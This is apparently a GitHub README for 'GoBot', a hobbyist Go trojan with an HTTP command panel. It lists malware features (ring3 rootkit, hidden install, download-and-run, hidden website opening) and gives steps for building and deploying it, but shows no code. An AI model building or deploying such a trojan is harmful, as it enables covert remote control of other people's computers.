# GoBot

GoBot is a project i am working on as i learn Go. GoBot is a PoC(Proof of Concept) Trojan that uses HTTP connections for commands and sending information.

# Development

Stopped working on this; I am a vary bad coder and don't think i can do much more myself... I will continue trying to learn to code in Go though i may never work on this project again.... If ANYONE wants you can take over this project, see what Go can do.

# Current Features

* Base64 Encoding/Decoding
* Uniqe ID Generation (MD5)
* Message Box
* Install
* Open Website - Visable
* Open Website - Hidden
* Single Instance
* Ring3 Rootkit (Written in C)
* Download and Run
* Open Program
* Simple to use Control Panel (PHP, HTML, SQL)

# How to Build and Use

* Use the command go get https://github.com/SaturnsVoid/GoBot
* Edit the settings to your liking in GoBot.go
* Compile GoBot.go with the other folder inside src
* Edit the Control Panels settings (Key = your login to see the control panel)
* Import the MySQL database
* Upload the Control Panel to a secure server
* Run GoBot
* Command from Control Panel (Example Panel Login: http://127.0.0.1/gobot.php?cmd=key)

# Current Credits and Stuff

* http://github.com/luisiturrios/gowin
* http://code.google.com/p/winsvc/winapi
* http://www.guidgen.com/
* https://www.reddit.com/r/golang/
* http://golang.org/pkg/net/http/
* https://github.com/golang/go/wiki/WindowsDLLs
* http://vxheaven.org/forum/index.php
* https://mmcgrana.github.io/2012/09/go-by-example-timers-and-tickers.html
* https://github.com/petercunha/GoAT

# Terms of Use

	* Do NOT use this on any computer you do not own, or are allowed to run this on.
	* Credits must always be given, With linksback to here.
	* You may NEVER attempt to sell this, its free and open source.
	
# Other

Go is a amazing and powerful programming language. If you already haven't, check it out; https://golang.org/

# Donations

If you like my work, send me a game or item on Steam!

![alt tag](https://i.imgur.com/hNIHwQE.png)

http://steamcommunity.com/id/saturnsvoid


----------Update Log---------------------

10/11/2015 @ 5:15PM:
- Rewrote how checking internet connection is done
- New Ring3 Rootkit (https://github.com/petercunha/GoAT)
- New Install Method (https://github.com/petercunha/GoAT)
- New Control Panel
- Download and Run (for exe's)
- Run Program (exe, bat, ect..)
- Added 1 minute delay before connecting to panel (Security)
- Fixed custom "Check Command" timer
- Send basic information to Control Panel
- New DebugLog feature
- Code Cleaning
- Removed Uninstall (Have to rewrite it to work with new Rootkit and Install)

10/07/2015 @ 1:40PM:
- Rewrote GoBot.php to do the basics to test that the bot works.

10/06/2015 @ 12:00PM:
-  Changed the way the command URL is handled
-  Made a temporary fix for the Timer issue cousing issues with running and compiling. (woops)
